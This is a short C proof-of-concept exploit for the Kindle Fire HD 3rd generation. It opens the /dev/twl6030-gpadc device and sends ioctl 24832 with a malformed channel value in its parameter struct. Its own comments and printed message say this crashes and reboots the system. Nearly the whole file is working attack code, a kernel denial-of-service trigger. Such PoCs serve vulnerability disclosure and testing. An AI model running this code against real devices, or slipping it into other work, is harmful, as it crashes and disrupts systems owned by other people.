/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/twl6030-gpadc causes 
 * the system crash via IOCTL 24832. 
 *
 * This Poc should run with permission to do ioctl on /dev/twl6030-gpadc.
 *
 */
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/twl6030-gpadc";
static command = 24832; 

struct twl6030_gpadc_user_parms {
    int channel;
    int status;
    unsigned short result;
};


int main(int argc, char **argv, char **env) {
        struct twl6030_gpadc_user_parms payload;
        payload.channel = 0x9b2a9212;
        payload.status = 0x0;
        payload.result = 0x0;

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd < 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 > /data/local/tmp/log");
            return -1;
        }

        printf("Try ioctl device file '%s', with command 0x%x and payload NULL\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &payload) < 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 > /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}